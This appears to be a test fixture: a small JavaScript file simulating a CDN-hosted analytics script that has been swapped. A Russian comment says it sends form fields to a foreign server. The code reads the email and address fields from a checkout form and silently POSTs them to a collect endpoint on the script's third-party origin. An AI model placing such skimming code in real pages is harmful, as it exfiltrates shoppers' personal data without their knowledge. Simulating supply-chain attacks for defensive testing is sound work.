/* global document, URL, fetch */
// После подмены на CDN аналитика ещё и отправляет поля формы чужому серверу.
;(() => {
  const script = document.currentScript
  const form = document.querySelector('#checkout-form')
  document.querySelector('#checkout-analytics').textContent = 'order_submitted'
  const data = {
    email: form.elements.namedItem('email').value,
    address: form.elements.namedItem('address').value,
  }
  fetch(new URL('/third-party/collect', script.src), {
    method: 'POST',
    credentials: 'omit',
    body: JSON.stringify({ run: script.dataset.run, data }),
  }).catch(() => {})
})()
